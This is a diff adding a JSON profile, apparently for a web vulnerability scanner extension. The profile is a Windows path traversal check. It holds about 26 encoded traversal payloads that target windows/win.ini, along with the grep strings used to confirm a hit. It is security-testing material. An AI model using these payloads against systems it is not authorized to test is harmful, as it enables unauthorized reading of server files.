@@ -1,0 +1,91 @@
+[
+  {
+    "profile_name": "Path_Traversal_Windows",
+    "enabled": true,
+    "scanner": "active",
+    "author": "@bountysecurity",
+    "steps": [
+      {
+        "request_type": "original",
+        "reuse_cookie": false,
+        "insertion_point": "same",
+        "raw_request": "",
+        "payloads": [
+          "true,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini",
+          "true,..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini",
+          "true,/./././././././././././windows/win.ini",
+          "true,/../../../../../../../../../../../windows/win.ini",
+          "true,/..\\../..\\../..\\../..\\../..\\../..\\../windows/win.ini",
+          "true,/.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./windows/win.ini",
+          "true,..//..//..//..//..//windows/win.ini",
+          "true,../../../../../../../../../../../../windows/win.ini",
+          "true,../../windows/win.ini",
+          "true,..\\../..\\../..\\../..\\../windows/win.ini",
+          "true,..\\../..\\../windows/win.ini",
+          "true,..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows/win.ini",
+          "true,\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows/win.ini",
+          "true,/../../../../../../../../../../../windows/win.ini%00",
+          "true,../../../../../../../../../../../../windows/win.ini%00",
+          "true,..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows/win.ini%00",
+          "true,/../../../../../../../../../../../windows/win.ini%00.html",
+          "true,/../../../../../../../../../../../windows/win.ini%00.jpg",
+          "true,..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../windows/win.ini",
+          "true,../../../../../../../../windows/win.ini",
+          "true,..\\..\\..\\..\\..\\..\\..\\..\\windows/win.ini",
+          "true,c:\\windows/win.ini",
+          "true,c:/windows/win.ini",
+          "true,php://filter/zlib.deflate/convert.base64-encode/resource\u003dc:/windows/win.ini",
+          "true,..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
+          "true,%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini"
+        ],
+        "payloads_file": "",
+        "payload_position": "replace",
+        "change_http_request": false,
+        "change_http_request_type": "post_to_get",
+        "insertion_points": [
+          "extension_provice",
+          "entire_body",
+          "param_body",
+          "param_cookie",
+          "param_json",
+          "url_path_folder",
+          "param_multipart_attr",
+          "user_provided",
+          "param_url",
+          "param_xml",
+          "param_xml_attr",
+          "url_path_filename",
+          "param_name_multi_part_attr",
+          "entire_body_xml",
+          "entire_body_json",
+          "entire_body_multipart"
+        ],
+        "header_value": false,
+        "new_headers": [],
+        "match_replace": [],
+        "encoder": [],
+        "url_encode": false,
+        "chars_to_url_encode": "",
+        "greps_file": "",
+        "grep": [
+          "true,,Simple String,,for 16-bit app support",
+          "true,OR,Simple String,,[fonts]"
+        ],
+        "redir_type": "on_site",
+        "max_redir": 4,
+        "show_alert": "always",
+        "issue_name": "Path_Traversal_Windows",
+        "issue_severity": "High",
+        "issue_confidence": "Certain",
+        "issue_detail": "https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt\u003cbr/\u003e\u003cbr/\u003e\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal\u003cbr/\u003e\u003cbr/\u003e\nhttps://github.com/soffensive/windowsblindread\n\n\u003cbr/\u003e\u003cbr/\u003e- PAYLOAD: \u003cbr/\u003e\u003cpayload\u003e\n\u003cbr/\u003e\u003cbr/\u003e\n- GREP: \u003cbr/\u003e\u003cgrep\u003e",
+        "remediation_detail": "",
+        "issue_background": "",
+        "remediation_background": ""
+      }
+    ],
+    "Tags": [
+      "Path_Traversal",
+      "All"
+    ]
+  }
+]
